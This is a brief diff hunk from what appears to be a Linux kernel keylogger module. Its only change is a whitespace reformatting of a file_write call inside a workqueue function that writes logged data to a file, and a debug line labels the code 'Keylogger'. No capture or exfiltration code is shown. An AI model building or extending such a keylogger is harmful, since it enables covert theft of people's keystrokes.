@@ -61,7 +61,7 @@ static void my_wq_function( struct work_struct *work)
 
     dbg("Keylogger: my_work.x %d %s\n", my_work->size, my_work->dt );
 
-    file_write(filep,my_work->size,my_work->dt,my_work->size);
+    file_write(filep, my_work->size, my_work->dt, my_work->size);
 
     kfree( (void *)my_work->dt );
     kfree( (void *)work );
